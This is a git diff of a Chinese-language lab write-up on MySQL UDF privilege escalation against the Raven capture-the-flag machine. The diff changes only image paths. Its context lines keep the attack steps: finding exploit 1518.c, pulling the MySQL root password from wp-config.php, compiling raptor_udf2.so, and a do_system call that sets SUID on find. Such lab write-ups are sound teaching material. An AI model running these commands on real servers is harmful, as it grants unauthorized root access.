@@ -17,16 +17,16 @@ UDF（user-defined function）是MySQL的一个拓展接口，也可称为用户
 ### 实例 - Raven靶机
 
 - 使用 searchsploit 从 exploit-db 中搜索相关的 exploit ：
-![](../pic/mysql-udf-1.png)
+![](pic/mysql-udf-1.png)
 
 - 这里选择 1518.c 进行下载：
-![](../pic/mysql-udf-2.png)
+![](pic/mysql-udf-2.png)
 
 - 查看 1518.c 可看到使用说明：
-![](../pic/mysql-udf-3.png)
+![](pic/mysql-udf-3.png)
 
 - 进入 `/var/www/html/wordpress` 目录中搜索 `wp-config.php` 文件，因为该文件中记录着 MySQL 的用户名/密码，可看到：`root/R@v3nSecurity`
-![](../pic/mysql-udf-4.png)
+![](pic/mysql-udf-4.png)
 
 - 然后，再将 1518.c 编译成共享库：
 ```
@@ -34,7 +34,7 @@ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 ```
 - 编译后生成 1518.so，并将它下载到靶机中： /tmp/1518.so
 接着，使用得到的 MySQL root密码，进入 MySQL shell：
-![](../pic/mysql-udf-5.png)
+![](pic/mysql-udf-5.png)
 
 - 依次执行如下语句：
 ```
@@ -55,7 +55,7 @@ select do_system('chmod u+s /usr/bin/find');
 ```
 
 - 此时，回到 `/tmp` 目录，使用 `find` 命令，成功提权
-![](../pic/mysql-udf-6.png)
+![](pic/mysql-udf-6.png)
 
 
 #### Reference
